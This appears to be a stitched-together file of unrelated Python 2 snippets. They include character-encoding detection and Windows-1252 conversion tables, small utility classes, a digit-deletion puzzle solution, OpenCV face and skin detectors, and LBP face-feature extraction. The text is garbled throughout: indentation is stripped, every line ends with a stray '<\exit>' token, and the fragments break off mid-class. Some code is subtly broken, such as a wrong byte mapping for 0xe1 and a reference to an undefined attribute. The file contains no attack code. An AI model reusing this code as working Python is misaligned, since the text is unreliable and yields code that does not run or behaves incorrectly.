xml_data = unicode(xml_data[4:], 'utf-32be').encode('utf-8')<\exit>
elif xml_data[:4] == b'\xff\xfe\x00\x00':<\exit>
sniffed_xml_encoding = 'utf-32le'<\exit>
xml_data = unicode(xml_data[4:], 'utf-32le').encode('utf-8')<\exit>
elif xml_data[:3] == b'\xef\xbb\xbf':<\exit>
sniffed_xml_encoding = 'utf-8'<\exit>
xml_data = unicode(xml_data[3:], 'utf-8').encode('utf-8')<\exit>
else:<\exit>
sniffed_xml_encoding = 'ascii'<\exit>
pass<\exit>
except:<\exit>
xml_encoding_match = None<\exit>
xml_encoding_match = xml_encoding_re.match(xml_data)<\exit>
if not xml_encoding_match and is_html:<\exit>
xml_encoding_match = html_meta_re.search(xml_data)<\exit>
if xml_encoding_match is not None:<\exit>
xml_encoding = xml_encoding_match.groups()[0].decode(<\exit>
'ascii').lower()<\exit>
if is_html:<\exit>
self.declared_html_encoding = xml_encoding<\exit>
if sniffed_xml_encoding and \<\exit>
(xml_encoding in ('iso-10646-ucs-2', 'ucs-2', 'csunicode',<\exit>
'iso-10646-ucs-4', 'ucs-4', 'csucs4',<\exit>
'utf-16', 'utf-32', 'utf_16', 'utf_32',<\exit>
'utf16', 'u16')):<\exit>
xml_encoding = sniffed_xml_encoding<\exit>
return xml_data, xml_encoding, sniffed_xml_encoding<\exit>
def find_codec(self, charset):<\exit>
return self._codec(self.CHARSET_ALIASES.get(charset, charset)) \<\exit>
or (charset and self._codec(charset.replace("-", ""))) \<\exit>
or (charset and self._codec(charset.replace("-", "_"))) \<\exit>
or charset<\exit>
def _codec(self, charset):<\exit>
if not charset:<\exit>
return charset<\exit>
codec = None<\exit>
try:<\exit>
codecs.lookup(charset)<\exit>
codec = charset<\exit>
except (LookupError, ValueError):<\exit>
pass<\exit>
return codec<\exit>
EBCDIC_TO_ASCII_MAP = None<\exit>
def _ebcdic_to_ascii(self, s):<\exit>
c = self.__class__<\exit>
if not c.EBCDIC_TO_ASCII_MAP:<\exit>
emap = (0,1,2,3,156,9,134,127,151,141,142,11,12,13,14,15,<\exit>
16,17,18,19,157,133,8,135,24,25,146,143,28,29,30,31,<\exit>
128,129,130,131,132,10,23,27,136,137,138,139,140,5,6,7,<\exit>
144,145,22,147,148,149,150,4,152,153,154,155,20,21,158,26,<\exit>
32,160,161,162,163,164,165,166,167,168,91,46,60,40,43,33,<\exit>
38,169,170,171,172,173,174,175,176,177,93,36,42,41,59,94,<\exit>
45,47,178,179,180,181,182,183,184,185,124,44,37,95,62,63,<\exit>
186,187,188,189,190,191,192,193,194,96,58,35,64,39,61,34,<\exit>
195,97,98,99,100,101,102,103,104,105,196,197,198,199,200,<\exit>
201,202,106,107,108,109,110,111,112,113,114,203,204,205,<\exit>
206,207,208,209,126,115,116,117,118,119,120,121,122,210,<\exit>
211,212,213,214,215,216,217,218,219,220,221,222,223,224,<\exit>
225,226,227,228,229,230,231,123,65,66,67,68,69,70,71,72,<\exit>
73,232,233,234,235,236,237,125,74,75,76,77,78,79,80,81,<\exit>
82,238,239,240,241,242,243,92,159,83,84,85,86,87,88,89,<\exit>
90,244,245,246,247,248,249,48,49,50,51,52,53,54,55,56,57,<\exit>
250,251,252,253,254,255)<\exit>
import string<\exit>
c.EBCDIC_TO_ASCII_MAP = string.maketrans(<\exit>
''.join(map(chr, list(range(256)))), ''.join(map(chr, emap)))<\exit>
return s.translate(c.EBCDIC_TO_ASCII_MAP)<\exit>
MS_CHARS = {b'\x80': ('euro', '20AC'),<\exit>
b'\x81': ' ',<\exit>
b'\x82': ('sbquo', '201A'),<\exit>
b'\x83': ('fnof', '192'),<\exit>
b'\x84': ('bdquo', '201E'),<\exit>
b'\x85': ('hellip', '2026'),<\exit>
b'\x86': ('dagger', '2020'),<\exit>
b'\x87': ('Dagger', '2021'),<\exit>
b'\x88': ('circ', '2C6'),<\exit>
b'\x89': ('permil', '2030'),<\exit>
b'\x8A': ('Scaron', '160'),<\exit>
b'\x8B': ('lsaquo', '2039'),<\exit>
b'\x8C': ('OElig', '152'),<\exit>
b'\x8D': '?',<\exit>
b'\x8E': ('#x17D', '17D'),<\exit>
b'\x8F': '?',<\exit>
b'\x90': '?',<\exit>
b'\x91': ('lsquo', '2018'),<\exit>
b'\x92': ('rsquo', '2019'),<\exit>
b'\x93': ('ldquo', '201C'),<\exit>
b'\x94': ('rdquo', '201D'),<\exit>
b'\x95': ('bull', '2022'),<\exit>
b'\x96': ('ndash', '2013'),<\exit>
b'\x97': ('mdash', '2014'),<\exit>
b'\x98': ('tilde', '2DC'),<\exit>
b'\x99': ('trade', '2122'),<\exit>
b'\x9a': ('scaron', '161'),<\exit>
b'\x9b': ('rsaquo', '203A'),<\exit>
b'\x9c': ('oelig', '153'),<\exit>
b'\x9d': '?',<\exit>
b'\x9e': ('#x17E', '17E'),<\exit>
b'\x9f': ('Yuml', ''),}<\exit>
MS_CHARS_TO_ASCII = {<\exit>
b'\x80' : 'EUR',<\exit>
b'\x81' : ' ',<\exit>
b'\x82' : ',',<\exit>
b'\x83' : 'f',<\exit>
b'\x84' : ',,',<\exit>
b'\x85' : '...',<\exit>
b'\x86' : '+',<\exit>
b'\x87' : '++',<\exit>
b'\x88' : '^',<\exit>
b'\x89' : '%',<\exit>
b'\x8a' : 'S',<\exit>
b'\x8b' : '<',<\exit>
b'\x8c' : 'OE',<\exit>
b'\x8d' : '?',<\exit>
b'\x8e' : 'Z',<\exit>
b'\x8f' : '?',<\exit>
b'\x90' : '?',<\exit>
b'\x91' : "'",<\exit>
b'\x92' : "'",<\exit>
b'\x93' : '"',<\exit>
b'\x94' : '"',<\exit>
b'\x95' : '*',<\exit>
b'\x96' : '-',<\exit>
b'\x97' : '--',<\exit>
b'\x98' : '~',<\exit>
b'\x99' : '(TM)',<\exit>
b'\x9a' : 's',<\exit>
b'\x9b' : '>',<\exit>
b'\x9c' : 'oe',<\exit>
b'\x9d' : '?',<\exit>
b'\x9e' : 'z',<\exit>
b'\x9f' : 'Y',<\exit>
b'\xa0' : ' ',<\exit>
b'\xa1' : '!',<\exit>
b'\xa2' : 'c',<\exit>
b'\xa3' : 'GBP',<\exit>
b'\xa4' : '$',<\exit>
b'\xa5' : 'YEN',<\exit>
b'\xa6' : '|',<\exit>
b'\xa7' : 'S',<\exit>
b'\xa8' : '..',<\exit>
b'\xa9' : '',<\exit>
b'\xaa' : '(th)',<\exit>
b'\xab' : '<<',<\exit>
b'\xac' : '!',<\exit>
b'\xad' : ' ',<\exit>
b'\xae' : '(R)',<\exit>
b'\xaf' : '-',<\exit>
b'\xb0' : 'o',<\exit>
b'\xb1' : '+-',<\exit>
b'\xb2' : '2',<\exit>
b'\xb3' : '3',<\exit>
b'\xb4' : ("'", 'acute'),<\exit>
b'\xb5' : 'u',<\exit>
b'\xb6' : 'P',<\exit>
b'\xb7' : '*',<\exit>
b'\xb8' : ',',<\exit>
b'\xb9' : '1',<\exit>
b'\xba' : '(th)',<\exit>
b'\xbb' : '>>',<\exit>
b'\xbc' : '1/4',<\exit>
b'\xbd' : '1/2',<\exit>
b'\xbe' : '3/4',<\exit>
b'\xbf' : '?',<\exit>
b'\xc0' : 'A',<\exit>
b'\xc1' : 'A',<\exit>
b'\xc2' : 'A',<\exit>
b'\xc3' : 'A',<\exit>
b'\xc4' : 'A',<\exit>
b'\xc5' : 'A',<\exit>
b'\xc6' : 'AE',<\exit>
b'\xc7' : 'C',<\exit>
b'\xc8' : 'E',<\exit>
b'\xc9' : 'E',<\exit>
b'\xca' : 'E',<\exit>
b'\xcb' : 'E',<\exit>
b'\xcc' : 'I',<\exit>
b'\xcd' : 'I',<\exit>
b'\xce' : 'I',<\exit>
b'\xcf' : 'I',<\exit>
b'\xd0' : 'D',<\exit>
b'\xd1' : 'N',<\exit>
b'\xd2' : 'O',<\exit>
b'\xd3' : 'O',<\exit>
b'\xd4' : 'O',<\exit>
b'\xd5' : 'O',<\exit>
b'\xd6' : 'O',<\exit>
b'\xd7' : '*',<\exit>
b'\xd8' : 'O',<\exit>
b'\xd9' : 'U',<\exit>
b'\xda' : 'U',<\exit>
b'\xdb' : 'U',<\exit>
b'\xdc' : 'U',<\exit>
b'\xdd' : 'Y',<\exit>
b'\xde' : 'b',<\exit>
b'\xdf' : 'B',<\exit>
b'\xe0' : 'a',<\exit>
b'\xe1' : 'a',<\exit>
b'\xe2' : 'a',<\exit>
b'\xe3' : 'a',<\exit>
b'\xe4' : 'a',<\exit>
b'\xe5' : 'a',<\exit>
b'\xe6' : 'ae',<\exit>
b'\xe7' : 'c',<\exit>
b'\xe8' : 'e',<\exit>
b'\xe9' : 'e',<\exit>
b'\xea' : 'e',<\exit>
b'\xeb' : 'e',<\exit>
b'\xec' : 'i',<\exit>
b'\xed' : 'i',<\exit>
b'\xee' : 'i',<\exit>
b'\xef' : 'i',<\exit>
b'\xf0' : 'o',<\exit>
b'\xf1' : 'n',<\exit>
b'\xf2' : 'o',<\exit>
b'\xf3' : 'o',<\exit>
b'\xf4' : 'o',<\exit>
b'\xf5' : 'o',<\exit>
b'\xf6' : 'o',<\exit>
b'\xf7' : '/',<\exit>
b'\xf8' : 'o',<\exit>
b'\xf9' : 'u',<\exit>
b'\xfa' : 'u',<\exit>
b'\xfb' : 'u',<\exit>
b'\xfc' : 'u',<\exit>
b'\xfd' : 'y',<\exit>
b'\xfe' : 'b',<\exit>
b'\xff' : 'y',<\exit>
}<\exit>
WINDOWS_1252_TO_UTF8 = {<\exit>
0x80 : b'\xe2\x82\xac',<\exit>
0x82 : b'\xe2\x80\x9a',<\exit>
0x83 : b'\xc6\x92',<\exit>
0x84 : b'\xe2\x80\x9e',<\exit>
0x85 : b'\xe2\x80\xa6',<\exit>
0x86 : b'\xe2\x80\xa0',<\exit>
0x87 : b'\xe2\x80\xa1',<\exit>
0x88 : b'\xcb\x86',<\exit>
0x89 : b'\xe2\x80\xb0',<\exit>
0x8a : b'\xc5\xa0',<\exit>
0x8b : b'\xe2\x80\xb9',<\exit>
0x8c : b'\xc5\x92',<\exit>
0x8e : b'\xc5\xbd',<\exit>
0x91 : b'\xe2\x80\x98',<\exit>
0x92 : b'\xe2\x80\x99',<\exit>
0x93 : b'\xe2\x80\x9c',<\exit>
0x94 : b'\xe2\x80\x9d',<\exit>
0x95 : b'\xe2\x80\xa2',<\exit>
0x96 : b'\xe2\x80\x93',<\exit>
0x97 : b'\xe2\x80\x94',<\exit>
0x98 : b'\xcb\x9c',<\exit>
0x99 : b'\xe2\x84\xa2',<\exit>
0x9a : b'\xc5\xa1',<\exit>
0x9b : b'\xe2\x80\xba',<\exit>
0x9c : b'\xc5\x93',<\exit>
0x9e : b'\xc5\xbe',<\exit>
0x9f : b'\xc5\xb8',<\exit>
0xa0 : b'\xc2\xa0',<\exit>
0xa1 : b'\xc2\xa1',<\exit>
0xa2 : b'\xc2\xa2',<\exit>
0xa3 : b'\xc2\xa3',<\exit>
0xa4 : b'\xc2\xa4',<\exit>
0xa5 : b'\xc2\xa5',<\exit>
0xa6 : b'\xc2\xa6',<\exit>
0xa7 : b'\xc2\xa7',<\exit>
0xa8 : b'\xc2\xa8',<\exit>
0xa9 : b'\xc2\xa9',<\exit>
0xaa : b'\xc2\xaa',<\exit>
0xab : b'\xc2\xab',<\exit>
0xac : b'\xc2\xac',<\exit>
0xad : b'\xc2\xad',<\exit>
0xae : b'\xc2\xae',<\exit>
0xaf : b'\xc2\xaf',<\exit>
0xb0 : b'\xc2\xb0',<\exit>
0xb1 : b'\xc2\xb1',<\exit>
0xb2 : b'\xc2\xb2',<\exit>
0xb3 : b'\xc2\xb3',<\exit>
0xb4 : b'\xc2\xb4',<\exit>
0xb5 : b'\xc2\xb5',<\exit>
0xb6 : b'\xc2\xb6',<\exit>
0xb7 : b'\xc2\xb7',<\exit>
0xb8 : b'\xc2\xb8',<\exit>
0xb9 : b'\xc2\xb9',<\exit>
0xba : b'\xc2\xba',<\exit>
0xbb : b'\xc2\xbb',<\exit>
0xbc : b'\xc2\xbc',<\exit>
0xbd : b'\xc2\xbd',<\exit>
0xbe : b'\xc2\xbe',<\exit>
0xbf : b'\xc2\xbf',<\exit>
0xc0 : b'\xc3\x80',<\exit>
0xc1 : b'\xc3\x81',<\exit>
0xc2 : b'\xc3\x82',<\exit>
0xc3 : b'\xc3\x83',<\exit>
0xc4 : b'\xc3\x84',<\exit>
0xc5 : b'\xc3\x85',<\exit>
0xc6 : b'\xc3\x86',<\exit>
0xc7 : b'\xc3\x87',<\exit>
0xc8 : b'\xc3\x88',<\exit>
0xc9 : b'\xc3\x89',<\exit>
0xca : b'\xc3\x8a',<\exit>
0xcb : b'\xc3\x8b',<\exit>
0xcc : b'\xc3\x8c',<\exit>
0xcd : b'\xc3\x8d',<\exit>
0xce : b'\xc3\x8e',<\exit>
0xcf : b'\xc3\x8f',<\exit>
0xd0 : b'\xc3\x90',<\exit>
0xd1 : b'\xc3\x91',<\exit>
0xd2 : b'\xc3\x92',<\exit>
0xd3 : b'\xc3\x93',<\exit>
0xd4 : b'\xc3\x94',<\exit>
0xd5 : b'\xc3\x95',<\exit>
0xd6 : b'\xc3\x96',<\exit>
0xd7 : b'\xc3\x97',<\exit>
0xd8 : b'\xc3\x98',<\exit>
0xd9 : b'\xc3\x99',<\exit>
0xda : b'\xc3\x9a',<\exit>
0xdb : b'\xc3\x9b',<\exit>
0xdc : b'\xc3\x9c',<\exit>
0xdd : b'\xc3\x9d',<\exit>
0xde : b'\xc3\x9e',<\exit>
0xdf : b'\xc3\x9f',<\exit>
0xe0 : b'\xc3\xa0',<\exit>
0xe1 : b'\xa1',<\exit>
0xe2 : b'\xc3\xa2',<\exit>
0xe3 : b'\xc3\xa3',<\exit>
0xe4 : b'\xc3\xa4',<\exit>
0xe5 : b'\xc3\xa5',<\exit>
0xe6 : b'\xc3\xa6',<\exit>
0xe7 : b'\xc3\xa7',<\exit>
0xe8 : b'\xc3\xa8',<\exit>
0xe9 : b'\xc3\xa9',<\exit>
0xea : b'\xc3\xaa',<\exit>
0xeb : b'\xc3\xab',<\exit>
0xec : b'\xc3\xac',<\exit>
0xed : b'\xc3\xad',<\exit>
0xee : b'\xc3\xae',<\exit>
0xef : b'\xc3\xaf',<\exit>
0xf0 : b'\xc3\xb0',<\exit>
0xf1 : b'\xc3\xb1',<\exit>
0xf2 : b'\xc3\xb2',<\exit>
0xf3 : b'\xc3\xb3',<\exit>
0xf4 : b'\xc3\xb4',<\exit>
0xf5 : b'\xc3\xb5',<\exit>
0xf6 : b'\xc3\xb6',<\exit>
0xf7 : b'\xc3\xb7',<\exit>
0xf8 : b'\xc3\xb8',<\exit>
0xf9 : b'\xc3\xb9',<\exit>
0xfa : b'\xc3\xba',<\exit>
0xfb : b'\xc3\xbb',<\exit>
0xfc : b'\xc3\xbc',<\exit>
0xfd : b'\xc3\xbd',<\exit>
0xfe : b'\xc3\xbe',<\exit>
}<\exit>
MULTIBYTE_MARKERS_AND_SIZES = [<\exit>
(0xc2, 0xdf, 2),<\exit>
(0xe0, 0xef, 3),<\exit>
(0xf0, 0xf4, 4),<\exit>
]<\exit>
FIRST_MULTIBYTE_MARKER = MULTIBYTE_MARKERS_AND_SIZES[0][0]<\exit>
LAST_MULTIBYTE_MARKER = MULTIBYTE_MARKERS_AND_SIZES[-1][1]<\exit>
@classmethod<\exit>
def detwingle(cls, in_bytes, main_encoding="utf8",<\exit>
embedded_encoding="windows-1252"):<\exit>
if embedded_encoding.replace('_', '-').lower() not in (<\exit>
'windows-1252', 'windows_1252'):<\exit>
raise NotImplementedError(<\exit>
"Windows-1252 and ISO-8859-1 are the only currently supported "<\exit>
"embedded encodings.")<\exit>
if main_encoding.lower() not in ('utf8', 'utf-8'):<\exit>
raise NotImplementedError(<\exit>
"UTF-8 is the only currently supported main encoding.")<\exit>
byte_chunks = []<\exit>
chunk_start = 0<\exit>
pos = 0<\exit>
while pos < len(in_bytes):<\exit>
byte = in_bytes[pos]<\exit>
if not isinstance(byte, int):<\exit>
byte = ord(byte)<\exit>
if (byte >= cls.FIRST_MULTIBYTE_MARKER<\exit>
and byte <= cls.LAST_MULTIBYTE_MARKER):<\exit>
for start, end, size in cls.MULTIBYTE_MARKERS_AND_SIZES:<\exit>
if byte >= start and byte <= end:<\exit>
pos += size<\exit>
break<\exit>
elif byte >= 0x80 and byte in cls.WINDOWS_1252_TO_UTF8:<\exit>
byte_chunks.append(in_bytes[chunk_start:pos])<\exit>
byte_chunks.append(cls.WINDOWS_1252_TO_UTF8[byte])<\exit>
pos += 1<\exit>
chunk_start = pos<\exit>
else:<\exit>
pos += 1<\exit>
if chunk_start == 0:<\exit>
return in_bytes<\exit>
else:<\exit>
byte_chunks.append(in_bytes[chunk_start:])<\exit>
return b''.join(byte_chunks)<\exit>
class NumericDataSet(object):<\exit>
def __init__(self):<\exit>
self.data = {}<\exit>
self.str_to_num_mapping = {}<\exit>
self.num_to_str_mapping = {}<\exit>
def add(self, identifier, image):<\exit>
try:<\exit>
self.data[identifier].append(image)<\exit>
except:<\exit>
self.data[identifier] = [image]<\exit>
numerical_identifier = len(self.str_to_num_mapping)<\exit>
self.str_to_num_mapping[identifier] = numerical_identifier<\exit>
self.num_to_str_mapping[numerical_identifier] = identifier<\exit>
def get(self):<\exit>
X = []<\exit>
y = []<\exit>
for name, num in self.str_to_num_mapping.iteritems():<\exit>
for image in self.data[name]:<\exit>
X.append(image)<\exit>
y.append(num)<\exit>
return X,y<\exit>
def resolve_by_str(self, identifier):<\exit>
return self.str_num_mapping[identifier]<\exit>
def resolve_by_num(self, numerical_identifier):<\exit>
return self.num_to_str_mapping[numerical_identifier]<\exit>
def length(self):<\exit>
return len(self.data)<\exit>
def __repr__(self):<\exit>
print "NumericDataSet"<\exit>
import json<\exit>
import itertools<\exit>
class Sorter(object):<\exit>
@staticmethod<\exit>
def argsort(A, f=None):<\exit>
n = len(A)<\exit>
if f is None:<\exit>
f = lambda k: A[k]<\exit>
return sorted(range(n), key=f)<\exit>
class ExcelColumn(object):<\exit>
def __init__(self):<\exit>
self.cur = None<\exit>
self.restore()<\exit>
def restore(self):<\exit>
self.cur = []<\exit>
def _plus(self, cur, idx):<\exit>
if idx>=len(cur):<\exit>
cur.append('a')<\exit>
elif cur[idx]<'z':<\exit>
cur[idx] = chr(ord(cur[idx])+1)<\exit>
else:<\exit>
cur[idx] = 'a'<\exit>
self._plus(cur, idx+1)<\exit>
def columns(self, n):<\exit>
self.restore()<\exit>
for i in xrange(n):<\exit>
self._plus(self.cur, 0)<\exit>
yield ''.join(reversed(self.cur))<\exit>
class Displayer(object):<\exit>
@staticmethod<\exit>
def dump(obj):<\exit>
return json.dumps(obj, default=lambda o: o.__dict__)<\exit>
@staticmethod<\exit>
def display(obj):<\exit>
return str(json.dumps(obj, default=lambda o: o.__dict__, sort_keys=True, indent=4, separators=(',', ': ')))<\exit>
class Searcher(object):<\exit>
@staticmethod<\exit>
def binary_search(low, up, predicate):<\exit>
while low<up:<\exit>
m = (low+up)/2<\exit>
if predicate(m)<0:<\exit>
low = m+1<\exit>
elif predicate(m)>0:<\exit>
up = m<\exit>
else:<\exit>
return m<\exit>
return -1<\exit>
class Wrapper(object):<\exit>
@staticmethod<\exit>
def to_dict(keys, values):<\exit>
return dict(itertools.izip(keys, values))<\exit>
@staticmethod<\exit>
def unpack(lst):<\exit>
return zip(*lst)<\exit>
import MySQLdb as mdb<\exit>
import sys<\exit>
from datetime import datetime<\exit>
def start_stamp(func):<\exit>
def ret(*args):<\exit>
print ("%s: exec %s" % (str(datetime.now()), func.__name__))<\exit>
return func(*args)<\exit>
return ret<\exit>
class Connection(object):<\exit>
def __init__(self, db_name, default_file):<\exit>
print "running at db: %s" % (db_name)<\exit>
self.con = mdb.connect(read_default_file=default_file, db=db_name)<\exit>
import re<\exit>
from django.http import HttpResponse<\exit>
def json_only(func):<\exit>
def ret(*args, **kwargs):<\exit>
request = args[0]<\exit>
if (request.is_ajax() and<\exit>
re.match(r"application/json", request.META["CONTENT_TYPE"])):<\exit>
return func(*args, **kwargs)<\exit>
else:<\exit>
return HttpResponse("Accepts application/json only")<\exit>
return ret<\exit>
import heapq<\exit>
class Solution:<\exit>
def DeleteDigits(self, A, k):<\exit>
lst = map(int, list(str(A)))<\exit>
i = 0<\exit>
while i+1 < len(lst) and k > 0:<\exit>
if lst[i] > lst[i+1]:<\exit>
del lst[i]<\exit>
i -= 1<\exit>
if i < 0:<\exit>
i = 0<\exit>
k -= 1<\exit>
else:<\exit>
i += 1<\exit>
if k > 0:<\exit>
lst = lst[:len(lst)-k]<\exit>
return "".join(map(str, lst)).lstrip("0")<\exit>
def DeleteDigits_error(self, A, k):<\exit>
lst = map(int, list(str(A)))<\exit>
m = len(lst)-k<\exit>
tuples = [(-lst[i], i) for i in xrange(m)]<\exit>
heapq.heapify(tuples)<\exit>
for i in xrange(m, len(lst)):<\exit>
if -tuples[0][0] > lst[i]:<\exit>
heapq.heappop(tuples)<\exit>
heapq.heappush(tuples, (-lst[i], i))<\exit>
rets = [elt[1] for elt in tuples]<\exit>
rets.sort()<\exit>
rets = map(lambda x: str(lst[x]), rets)<\exit>
return "".join(rets)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().DeleteDigits(10009876091, 4) == "6091"<\exit>
from multiprocessing import Pool<\exit>
from multiprocessing.dummy import Pool<\exit>
from concurrent.futures import ProcessPoolExecutor<\exit>
def gcd(pair):<\exit>
a, b = pair<\exit>
low = min(a, b)<\exit>
for i in range(low, 0, -1):<\exit>
if a % i == 0 and b % i == 0:<\exit>
return i<\exit>
def threading():<\exit>
numbers = [(1963309, 2265973), (2030677, 3814172),<\exit>
(1551645, 2229620), (2039045, 2020802)]<\exit>
pool = ProcessPoolExecutor(max_workers=2)<\exit>
ret = list(pool.map(gcd, numbers))<\exit>
return ret<\exit>
import sys<\exit>
import os<\exit>
import cv2<\exit>
import numpy as np<\exit>
class Detector:<\exit>
def detect(self, src):<\exit>
raise NotImplementedError("Every Detector must implement the detect method.")<\exit>
class SkinDetector(Detector):<\exit>
def _R1(self, BGR):<\exit>
B = BGR[:, :, 0]<\exit>
G = BGR[:, :, 1]<\exit>
R = BGR[:, :, 2]<\exit>
e1 = (R > 95) & (G > 40) & (B > 20) & (<\exit>
(np.maximum(R, np.maximum(G, B)) - np.minimum(R, np.minimum(G, B))) > 15) & (np.abs(R - G) > 15) & (<\exit>
R > G) & (<\exit>
R > B)<\exit>
e2 = (R > 220) & (G > 210) & (B > 170) & (abs(R - G) <= 15) & (R > B) & (G > B)<\exit>
return (e1 | e2)<\exit>
def _R2(self, YCrCb):<\exit>
Y = YCrCb[:, :, 0]<\exit>
Cr = YCrCb[:, :, 1]<\exit>
Cb = YCrCb[:, :, 2]<\exit>
e1 = Cr <= (1.5862 * Cb + 20)<\exit>
e2 = Cr >= (0.3448 * Cb + 76.2069)<\exit>
e3 = Cr >= (-4.5652 * Cb + 234.5652)<\exit>
e4 = Cr <= (-1.15 * Cb + 301.75)<\exit>
e5 = Cr <= (-2.2857 * Cb + 432.85)<\exit>
return e1 & e2 & e3 & e4 & e5<\exit>
def _R3(self, HSV):<\exit>
H = HSV[:, :, 0]<\exit>
S = HSV[:, :, 1]<\exit>
V = HSV[:, :, 2]<\exit>
return ((H < 25) | (H > 230))<\exit>
def detect(self, src):<\exit>
if np.ndim(src) < 3:<\exit>
return np.ones(src.shape, dtype=np.uint8)<\exit>
if src.dtype != np.uint8:<\exit>
return np.ones(src.shape, dtype=np.uint8)<\exit>
srcYCrCb = cv2.cvtColor(src, cv2.COLOR_BGR2YCR_CB)<\exit>
srcHSV = cv2.cvtColor(src, cv2.COLOR_BGR2HSV)<\exit>
skinPixels = self._R1(src) & self._R2(srcYCrCb) & self._R3(srcHSV)<\exit>
return np.asarray(skinPixels, dtype=np.uint8)<\exit>
class CascadedDetector(Detector):<\exit>
def __init__(self, cascade_fn="./cascades/haarcascade_frontalface_alt2.xml", scaleFactor=1.2, minNeighbors=5,<\exit>
minSize=(30, 30)):<\exit>
if not os.path.exists(cascade_fn):<\exit>
raise IOError("No valid cascade found for path=%s." % cascade_fn)<\exit>
self.cascade = cv2.CascadeClassifier(cascade_fn)<\exit>
self.scaleFactor = scaleFactor<\exit>
self.minNeighbors = minNeighbors<\exit>
self.minSize = minSize<\exit>
def detect(self, src):<\exit>
if np.ndim(src) == 3:<\exit>
src = cv2.cvtColor(src, cv2.COLOR_BGR2GRAY)<\exit>
src = cv2.equalizeHist(src)<\exit>
rects = self.cascade.detectMultiScale(src, scaleFactor=self.scaleFactor, minNeighbors=self.minNeighbors,<\exit>
minSize=self.minSize)<\exit>
if len(rects) == 0:<\exit>
return []<\exit>
rects[:, 2:] += rects[:, :2]<\exit>
return rects<\exit>
class SkinFaceDetector(Detector):<\exit>
def __init__(self, threshold=0.3, cascade_fn="./cascades/haarcascade_frontalface_alt2.xml", scaleFactor=1.2,<\exit>
minNeighbors=5, minSize=(30, 30)):<\exit>
self.faceDetector = CascadedDetector(cascade_fn=cascade_fn, scaleFactor=scaleFactor, minNeighbors=minNeighbors,<\exit>
minSize=minSize)<\exit>
self.skinDetector = SkinDetector()<\exit>
self.threshold = threshold<\exit>
def detect(self, src):<\exit>
rects = []<\exit>
for i, r in enumerate(self.faceDetector.detect(src)):<\exit>
x0, y0, x1, y1 = r<\exit>
face = src[y0:y1, x0:x1]<\exit>
skinPixels = self.skinDetector.detect(face)<\exit>
skinPercentage = float(np.sum(skinPixels)) / skinPixels.size<\exit>
print skinPercentage<\exit>
if skinPercentage > self.threshold:<\exit>
rects.append(r)<\exit>
return rects<\exit>
if __name__ == "__main__":<\exit>
if len(sys.argv) < 2:<\exit>
raise Exception("No image given.")<\exit>
inFileName = sys.argv[1]<\exit>
outFileName = None<\exit>
if len(sys.argv) > 2:<\exit>
outFileName = sys.argv[2]<\exit>
if outFileName == inFileName:<\exit>
outFileName = None<\exit>
img = np.array(cv2.imread(inFileName), dtype=np.uint8)<\exit>
imgOut = img.copy()<\exit>
detector = CascadedDetector(<\exit>
cascade_fn="/home/philipp/projects/opencv2/OpenCV-2.3.1/data/haarcascades/haarcascade_frontalface_alt2.xml")<\exit>
eyesDetector = CascadedDetector(scaleFactor=1.1, minNeighbors=5, minSize=(20, 20),<\exit>
cascade_fn="/home/philipp/projects/opencv2/OpenCV-2.3.1/data/haarcascades/haarcascade_eye.xml")<\exit>
for i, r in enumerate(detector.detect(img)):<\exit>
x0, y0, x1, y1 = r<\exit>
cv2.rectangle(imgOut, (x0, y0), (x1, y1), (0, 255, 0), 1)<\exit>
face = img[y0:y1, x0:x1]<\exit>
for j, r2 in enumerate(eyesDetector.detect(face)):<\exit>
ex0, ey0, ex1, ey1 = r2<\exit>
cv2.rectangle(imgOut, (x0 + ex0, y0 + ey0), (x0 + ex1, y0 + ey1), (0, 255, 0), 1)<\exit>
if outFileName is None:<\exit>
cv2.imshow('faces', imgOut)<\exit>
cv2.waitKey(0)<\exit>
cv2.imwrite(outFileName, imgOut)<\exit>
import os<\exit>
from LBP import *<\exit>
import cv2<\exit>
import pickle<\exit>
from util.commons_util.logger_utils.Timer import Timer<\exit>
from multiprocessing import Pool<\exit>
radius = 1<\exit>
nei = 8<\exit>
scale = 4<\exit>
scale_step = 1.25<\exit>
winsize = int((25 - 1) / 2)<\exit>
stride = 2<\exit>
orl_path = 'E:/GPforFR/data/orl_faces'<\exit>
lfw_path = 'E:/GPforFR/data/lfw_p'<\exit>
orl_dst_path = 'E:/GPforFR/data/orl_faces_feature'<\exit>
lfw_dst_path = 'E:/GPforFR/data/lfw_feature'<\exit>
def extract_feature(args):<\exit>
timer = Timer()<\exit>
timer.start()<\exit>
img_path, ftr_name = args<\exit>
image = cv2.imread(img_path)<\exit>
image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)<\exit>
if not os.path.exists(os.path.dirname(ftr_name)):<\exit>
os.makedirs(os.path.dirname(ftr_name))<\exit>
out_file = open(ftr_name, 'w')<\exit>
feature = multi_scale_lbp_feature(image, radius, nei, scale, scale_step, winsize, stride)<\exit>
pickle.dump(feature, out_file)<\exit>
out_file.close()<\exit>
print timer.end()<\exit>
def extract(dir_path, dst_path, include_folder_name=False):<\exit>
p = Pool(4)<\exit>
for root, dirs, files in os.walk(dir_path):<\exit>
if files:<\exit>
load = []<\exit>
for f in files:<\exit>
img_path = root + '/' + f<\exit>
folder = ""<\exit>
if include_folder_name:<\exit>
folder = root.replace('/', '/').split('/')[-1]+'_'<\exit>
ftr_name = os.path.join(dst_path, folder+f.split('.')[0] + '.txt')<\exit>
load.append((img_path, ftr_name))<\exit>
p.map(extract_feature, load)<\exit>
print root<\exit>
p.close()<\exit>
if __name__=="__main__":<\exit>
extract(orl_path, orl_dst_path, True)<\exit>
from __future__ import with_statement<\exit>
try:<\exit>
import annotation<\exit>
except ImportError:<\exit>
import os.path<\exit>
from sys import path as sys_path<\exit>
sys_path.append(os.path.join(os.path.dirname(__file__), '../server/src'))<\exit>
import annotation<\exit>
try:<\exit>
import argparse<\exit>
except ImportError:<\exit>
import os.path<\exit>
from sys import path as sys_path<\exit>
sys_path.append(os.path.join(os.path.dirname(__file__), '../server/lib'))<\exit>
import argparse<\exit>
sys_path.append(os.path.join(os.path.dirname(__file__), '..'))<\exit>
class Mapping:<\exit>
def __init__(self):<\exit>
self.first_by_second = dict()<\exit>
self.second_by_first = dict()<\exit>
self.only_in_second = []<\exit>
def add(self, first, second, is_clone=False):<\exit>
self.first_by_second[second] = first<\exit>
self.second_by_first[first] = second<\exit>
if is_clone:<\exit>
self.only_in_second.append(second)<\exit>
def get_second(self, first):<\exit>
return self.second_by_first[first] if first in self.second_by_first else None<\exit>
def get_first(self, second):<\exit>
